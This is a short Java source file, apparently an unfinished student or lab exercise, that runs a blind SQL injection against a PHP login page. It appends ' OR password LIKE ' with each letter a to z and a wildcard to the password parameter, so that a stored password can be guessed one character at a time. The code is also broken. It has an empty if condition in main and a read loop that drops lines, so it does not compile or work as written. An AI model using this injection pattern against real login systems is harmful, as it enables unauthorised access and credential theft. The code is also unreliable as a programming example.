package com.example.bau1.webexract;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;

public class passwordthing {
    String [] rightPass;
    static String end = "%";
    static String page = "http://st223.dcs.kcl.ac.uk/osc2/profit.php?username=profit&password=' OR password LIKE '";
    static char alphabet;


    public static String openPage(){
        String webText = "";
        try {
            for (alphabet = 'a'; alphabet <= 'z'; alphabet++){
                URL url = new URL(page + alphabet+ end);
                URLConnection urlConnection = url.openConnection();
                InputStream is = urlConnection.getInputStream();
                BufferedReader br = new BufferedReader(new InputStreamReader(is));
                while ((webText = br.readLine()) != null) {
                    webText = br.readLine();
                }
            }

        }catch(IOException e){
            e.printStackTrace();
        }
        return webText;
    }

    public static void main(String[] args) {
        if (){
            page = page + alphabet;
            Log.d("test", " " + alphabet);
        }
    }

}
